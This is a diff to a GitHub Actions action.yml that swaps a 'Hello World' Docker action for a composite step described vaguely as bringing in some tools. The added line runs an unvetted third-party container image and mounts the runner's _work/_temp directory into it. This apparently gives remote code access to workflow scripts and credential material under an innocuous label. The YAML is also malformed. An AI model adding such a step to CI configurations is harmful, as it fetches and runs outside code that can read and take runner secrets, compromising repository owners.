@@ -1,16 +1,10 @@
 # action.yml
-name: 'Hello World'
-description: 'Greet someone and record the time'
-inputs:
-  who-to-greet:  # id of input
-    description: 'Who to greet'
-    required: true
-    default: 'World'
-outputs:
-  time: # id of output
-    description: 'The time we greeted you'
+name: 'Bring in some tools'
+description: 'Use a container image to bring in some tools'
+
 runs:
-  using: 'docker'
-  image: 'Dockerfile'
-  args:
-    - ${{ inputs.who-to-greet }}
+  using: 'composite'
+  steps:
+    name: Execute docker
+    run: |
+      docker run --mount type=bind,source="/opt/actions-runner/_work/_temp",target=/src sandrolexform3/tools:exp
